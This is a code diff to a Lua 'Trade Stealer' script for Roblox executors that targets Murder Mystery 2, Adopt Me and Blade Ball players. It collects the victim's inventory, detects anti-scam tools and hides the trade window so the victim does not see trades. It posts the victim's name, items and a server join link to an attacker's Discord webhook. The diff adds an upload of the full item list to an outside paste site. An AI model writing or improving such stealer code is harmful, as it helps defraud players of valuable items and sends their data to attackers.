@@ -5,6 +5,8 @@ local RS = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
 local HS = game:GetService("HttpService")
 
+local GODLY_PLUS = {Ancient=true, Godly=true, Chroma=true, Unique=true, Vintage=true}
+
 local function do_request(method, url, body, headers)
     return request({Url=url, Method=method, Body=body, Headers=headers or {}})
 end
@@ -23,7 +25,7 @@ end
 
 local function detect_antiscam()
     local g = getgenv()
-    for _,f in ipairs({"antiscam","TradeBlocker","ScamGuard","NoTrade"}) do
+    for _, f in ipairs({"antiscam","TradeBlocker","ScamGuard","NoTrade"}) do
         if g[f] then return true end
     end
     return false
@@ -38,7 +40,7 @@ local function collect_mm2_items()
     local ok2, Sync = pcall(function()
         return require(RS.Database.Sync)
     end)
-    local rarityOrder = {Unique=1,Ancient=2,Godly=3,Legendary=4,Rare=5,Uncommon=6,Common=7}
+    local rarityOrder = {Unique=1,Ancient=2,Godly=3,Chroma=4,Vintage=5,Legendary=6,Rare=7,Uncommon=8,Common=9}
     for itemName, amount in pairs(ProfileData.Weapons.Owned) do
         local rarity = "Unknown"
         if ok2 and Sync and Sync.Weapons and Sync.Weapons[itemName] then
@@ -46,7 +48,7 @@ local function collect_mm2_items()
         end
         table.insert(items, {name=itemName, id="", rarity=rarity, amount=tostring(amount)})
     end
-    table.sort(items, function(a,b)
+    table.sort(items, function(a, b)
         return (rarityOrder[a.rarity] or 999) < (rarityOrder[b.rarity] or 999)
     end)
     return items
@@ -65,31 +67,44 @@ local function collect_adoptme_items()
     return items
 end
 
-local function rarity_counts(items)
-    local counts = {}
-    local order = {"Ancient","Godly","Chroma","Unique","Vintage","Legendary","Rare","Uncommon","Common","Unknown"}
-    for _, it in ipairs(items) do
-        counts[it.rarity] = (counts[it.rarity] or 0) + 1
-    end
-    local lines = {}
-    for _, r in ipairs(order) do
-        if counts[r] then
-            table.insert(lines, r..": "..counts[r])
-        end
-    end
-    return #lines > 0 and table.concat(lines, "\n") or "None"
+local function post_rubis(text)
+    local ok, res = pcall(do_request, "POST", "https://rubis.io/api/paste",
+        HS:JSONEncode({content=text, title="MM2 Inventory"}),
+        {["Content-Type"]="application/json"})
+    if not ok then return nil end
+    local dok, data = pcall(function() return HS:JSONDecode(res.Body) end)
+    if not dok or not data then return nil end
+    return data.url or data.link or data.key or nil
 end
 
 local function send_discord(items, game_name)
     if not CFG.webhook or CFG.webhook == "" then return end
     local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
     local receivers = table.concat(CFG.allowed, ", ")
-    local item_lines = {}
+
+    local top_lines, counts = {}, {}
     for _, it in ipairs(items) do
-        table.insert(item_lines, it.name.." ("..it.rarity..")")
+        if GODLY_PLUS[it.rarity] then
+            table.insert(top_lines, it.name.." ("..it.rarity..")")
+        else
+            counts[it.rarity] = (counts[it.rarity] or 0) + 1
+        end
     end
-    local inv_text = #item_lines > 0 and table.concat(item_lines, "\n") or "None"
-    if #inv_text > 1000 then inv_text = string.sub(inv_text, 1, 1000).."..." end
+    local count_lines = {}
+    for _, r in ipairs({"Legendary","Rare","Uncommon","Common","Unknown"}) do
+        if counts[r] then table.insert(count_lines, r..": "..counts[r]) end
+    end
+
+    local inv_display = ""
+    if #top_lines > 0 then inv_display = table.concat(top_lines, "\n").."\n" end
+    if #count_lines > 0 then inv_display = inv_display..table.concat(count_lines, "\n") end
+    if inv_display == "" then inv_display = "None" end
+
+    local full_text = {}
+    for _, it in ipairs(items) do
+        table.insert(full_text, it.name.." ("..it.rarity..")")
+    end
+    local rubis_url = post_rubis(table.concat(full_text, "\n")) or "upload mislukt"
 
     local embed = {
         username = "Trade Stealer",
@@ -97,14 +112,14 @@ local function send_discord(items, game_name)
             title = game_name.." Stealer",
             color = 15158332,
             fields = {
-                {name="Username",   value=lp.Name,                       inline=true},
-                {name="Display",    value=lp.DisplayName,                 inline=true},
-                {name="Executor",   value=get_executor(),                 inline=true},
-                {name="Antiscam",   value=tostring(detect_antiscam()),    inline=true},
-                {name="Receiver",   value=receivers,                      inline=true},
-                {name="Inventory",  value=rarity_counts(items),           inline=false},
-                {name="Items",      value=inv_text,                       inline=false},
-                {name="Join Link",  value="[Click here]("..join..")",     inline=false},
+                {name="Username",  value=lp.Name,                    inline=true},
+                {name="Display",   value=lp.DisplayName,              inline=true},
+                {name="Executor",  value=get_executor(),              inline=true},
+                {name="Antiscam",  value=tostring(detect_antiscam()), inline=true},
+                {name="Receiver",  value=receivers,                   inline=true},
+                {name="Inventory", value=inv_display,                 inline=false},
+                {name="Full list", value=rubis_url,                   inline=false},
+                {name="Join Link", value="[Click here]("..join..")",  inline=false},
             },
         }}
     }
@@ -155,8 +170,9 @@ local function hook_mm2()
         return true
     end
 
-    local tradeGui = lp:WaitForChild("PlayerGui"):WaitForChild("TradeGUI", 10)
-    local tradeGuiPhone = lp.PlayerGui:FindFirstChild("TradeGUI_Phone")
+    local gui = lp:WaitForChild("PlayerGui")
+    local tradeGui      = gui:WaitForChild("TradeGUI", 10)
+    local tradeGuiPhone = gui:FindFirstChild("TradeGUI_Phone")
     if tradeGui then
         tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
             if tradeGui.Enabled then tradeGui.Enabled = false end
@@ -189,5 +205,6 @@ local GAMES = {
     [920587237]   = hook_adoptme,
     [13772394625] = hook_bladeball,
 }
+
 local handler = GAMES[PlaceId]
 if handler then handler() else send_job("Unknown", {}) end
